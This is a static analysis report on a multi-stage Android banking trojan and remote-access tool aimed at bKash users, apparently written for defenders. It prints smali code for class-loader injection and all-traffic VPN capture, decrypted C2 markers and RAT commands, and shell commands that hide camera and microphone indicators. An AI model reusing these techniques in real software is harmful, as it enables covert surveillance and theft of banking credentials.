# Static Analysis Findings

**Tool:** androguard 4.1.4, Python 3.12, strings, custom scripts  
**Date:** 2026-06-24  
**Scope:** Full static analysis — no execution  

---

## Summary Score Card

| Category | Finding | Risk |
|----------|---------|------|
| Stage count | 3 (stub → DEX inject → banking APK) | 🔴 Critical |
| DEX classes (stage 1) | 5 (pure dropper) | 🔴 Critical |
| DEX classes (stage 2) | 6,645 | 🔴 Critical |
| DEX classes (stage 3) | 4,522 | 🔴 Critical |
| Obfuscation level | Extreme (5 techniques) | 🔴 Critical |
| Permission evasion | 3 declared / 20+ actual | 🔴 Critical |
| VPN traffic capture | addRoute(0.0.0.0/0) | 🔴 Critical |
| Encryption layers | 3 (XOR+GZIP / XOR / AES) | 🔴 Critical |
| Certificate | AOSP debug cert | 🔴 High |
| C2 protocol | WebSocket + HTTP POST | 🔴 High |
| Capabilities | Banking + RAT + Miner + DoS | 🔴 Critical |
| Targeting | Bangladesh bKash (confirmed) | 🔴 Critical |

---

## Key DEX Findings

### Stage 1 (5 classes — dropper stub)

```
Package:  com.tyshpgid.akqczvkxm.vbz.rbi
Classes:  HpgFbwysCCJsnzoUH33TYeM72G2
          ODtyODdeGKP8Qdxn2rv11NC
          QFACMW3yiHwtbZuvCaivK4glJAr
          SERPXHvJXQ9NKa9059a6NQFkljxTn
          oI4lIJOlbjSkXqgwGehsi9Q9r   ← Application subclass (entry)
          
Methods:  m_0 through m_19 (numeric obfuscation)
          iufnxmkx()     ← DexClassLoader injection
          mgglxosk()     ← Asset bundle extraction
          attachBaseContext() ← drops payload.dex
          onCreate()     ← drops b.apk
```

### Stage 2 (payload.dex — 6,645 classes)

```
Package:  com.shell.a
Key classes:
  MainActivity         → Fake install UI + b.apk dropper
  PpVpn               → VPN service (intercepts 0.0.0.0/0)
  PpVpnStopper        → VPN lifecycle control
  InstallResultReceiver → Monitors b.apk installation
  Config              → Holds B_PACKAGE, B_ASSET_APK, B_MAIN_ACTIVITY
  
Libraries included:
  kotlinx.coroutines  → Async operations
  androidx.*          → Android UI (legitimacy camouflage)
```

### Stage 3 (b_classes.dex — 4,522 classes)

```
Package:  com.d9fe4v4.pmpgv.eai.uszaw
Key classes:
  e0                     → WebSocket C2 client (OkHttp3)
  e0$a                   → C2 command handler (30+ commands)
  dqssgbaajsdc           → Accessibility RAT service
  bmrejrotee             → Camera recording service
  CallBacker             → C2 callback manager
  BootReceiver           → Boot persistence
  SendSms                → SMS sending
  MyDeviceAdminReceiver  → Device admin (anti-uninstall)
  DownloadForegroundService → Payload downloader
  HomeSIM                → SIM/IMEI harvester
  Inputyvdcvtink         → Keystroke monitor
  cbjjyszzrrzhzovehl     → Screen overlay + sensor
  Msss                   → Messaging system
  VCN                    → VPN/network controller
  PlayS                  → Screen/media playback
  RequestAdm             → Device admin requester
  ResetServices          → Service watchdog
  Splasher               → App splash screen
  
Libraries:
  com.arthenica.ffmpegkit  → Screen recording
  okhttp3                  → WebSocket C2 transport
  kotlinx.coroutines       → Async
  lrswfcntfwficzgs.*      → Custom crypto library (obfuscated)
```

---

## Obfuscation Techniques (5 Methods)

### 1. Package/Class/Method Name Randomization
```
com.tyshpgid.akqczvkxm.vbz.rbi         ← Stage 1 package
HpgFbwysCCJsnzoUH33TYeM72G2            ← Class name
oI4lIJOlbjSkXqgwGehsi9Q9r             ← Application class
iufnxmkx(), mgglxosk()                 ← Method names
m_0 through m_19                        ← Method obfuscation
```

### 2. Resource File Name Randomization
All 900+ resource files have random alphanumeric names:
```
0AV0co8K33z3HIYGkA/7JkPosajre9JIKh.xml
NhxxcPuLOx   (encrypted payload DEX)
lAsFuQPphUK  (encrypted b.apk bundle)
AfhQlBuxfo   (encrypted Stage 3 DEX)
```

### 3. App Name Obfuscation
```
Label: "GO​​VV"
       ^^^^^^^^^
       Contains Unicode U+200A (Hair Space) + U+200B (Zero-Width Space)
       Invisible to users, renders as "GOVV"
```

### 4. Multi-layer String Encryption
```
Layer 1: fill-array-data byte arrays XOR'd with 12-byte repeating keys
Layer 2: Arabic Extended Unicode chars (U+06D6–U+06ED) for runtime strings
         → decoded via switch-on-hashCode in methods B() through O()
Result:  No plaintext strings visible in DEX dump
```

### 5. Payload Encryption (3 algorithms)
```
Primary:  Java Random XOR (seed=3017671131121758624) + GZIP
String:   Repeating-key XOR (12-byte keys embedded in fill-array-data)
Overlay:  AES with runtime-distributed key (rckey from C2)
```

---

## DexClassLoader Injection (Bytecode Proof)

```smali
# Method: iufnxmkx(Context, File, File) — confirmed from DEX bytecode

new-instance v0, Ldalvik/system/DexClassLoader;
invoke-virtual v5, Ljava/io/File;->getAbsolutePath()     # payload.dex path
invoke-virtual v4, Landroid/content/Context;->getClassLoader()

# Create DexClassLoader with payload.dex
invoke-direct v0, v5, v6, v1, v2, Ldalvik/system/DexClassLoader;-><init>()

# Reflection: get ActivityThread
const-string v5, "android.app.ActivityThread"
invoke-static v5, Ljava/lang/Class;->forName()

# Access internal mPackages field
const-string v2, "currentActivityThread"
invoke-virtual v5, v2, v1, Ljava/lang/Class;->getMethod()
invoke-virtual v5, v1, v6, Ljava/lang/reflect/Method;->invoke()

# Get mPackages map
const-string v1, "mPackages"
invoke-virtual v6, v1, Ljava/lang/Class;->getDeclaredField()
invoke-virtual v6, v1, Ljava/lang/reflect/AccessibleObject;->setAccessible(true)

# Get LoadedApk via WeakReference
invoke-interface v5, v4, Ljava/util/Map;->get(packageName)
invoke-virtual v4, Ljava/lang/ref/Reference;->get()

# Replace mClassLoader with our DexClassLoader
const-string v6, "mClassLoader"
invoke-virtual v5, v6, Ljava/lang/Class;->getDeclaredField()
invoke-virtual v5, v1, setAccessible(true)
invoke-virtual v5, v4, v0, Ljava/lang/reflect/Field;->set()  # ← INJECTION

# Also replace thread context classloader
invoke-static Ljava/lang/Thread;->currentThread()
invoke-virtual v4, v0, Ljava/lang/Thread;->setContextClassLoader()
```

---

## VPN Bytecode Confirmation

```smali
# PpVpn.onStartCommand() — confirmed from DEX bytecode

new-instance v0, Landroid/net/VpnService$Builder;
invoke-direct v0, v4, Landroid/net/VpnService$Builder;-><init>()

# VPN interface address
const-string v1, "10.99.0.1"
const/16 v2, 32
invoke-virtual v0, v1, v2, addAddress()

# Route ALL traffic (0.0.0.0/0) through VPN tunnel
const-string v1, "0.0.0.0"
const/4 v2, 0
invoke-virtual v0, v1, v2, addRoute()   # ← ALL traffic intercepted

invoke-virtual v0, establish()  # Create TUN device

# Internal identifier
const-string v0, "ShellA"
const-string v1, "PpVpn started, instance set"
invoke-static v0, v1, Landroid/util/Log;->i()
```

---

## Decrypted Strings (Selected — Key Findings)

### C2 Infrastructure
```
/yaarsa/private/yarsap_80541.php   ← C2 PHP endpoint
/yaarsa/private/log_error.php      ← Error logging
/config.json                        ← Remote config
ws://127.0.0.1:8080/               ← Local WebSocket bridge
```

### C2 Protocol Markers
```
<:CS:>          ← Command separator
___CMD_END___   ← Command terminator
[AST-PAS]       ← Auth marker
[:K3R1:]        ← Key marker
~NOPASS~        ← No screen lock
Slr_client      ← Client type ID
ServerSay:      ← C2-to-device prefix
```

### Banking / Surveillance
```
LockType: Password , Pass:    ← PIN/password capture
Live Key-logs                  ← Keylogger data type
content://sms/inbox            ← SMS database
content://sms/sent             ← Sent SMS
capturedUrl:                   ← Browser URL capture
livescreen                     ← Live screen stream command
continuous-video               ← Camera mode
At.acc.keystrk                 ← Accessibility keystrokes
```

### RAT Commands (decoded)
```
browser, screen, livescreen, scread, chat, micm, call,
SMS, keystrokes, clone, ject, lock, blker, snap, mining,
tols, terminal, fetch, upload, location, update, addA,
reip, rckey, cmnd, clip, chat, calf, micm, miner, ...
```

### Persistence
```
android.intent.action.BOOT_COMPLETED   ← Boot receiver
cmd deviceidle whitelist +             ← Battery optimization bypass
cmd device_config put privacy camera_mic_icons_enabled false
                                        ← Hide camera/mic indicators
Device admin is enabled.               ← Admin takeover confirmed
```
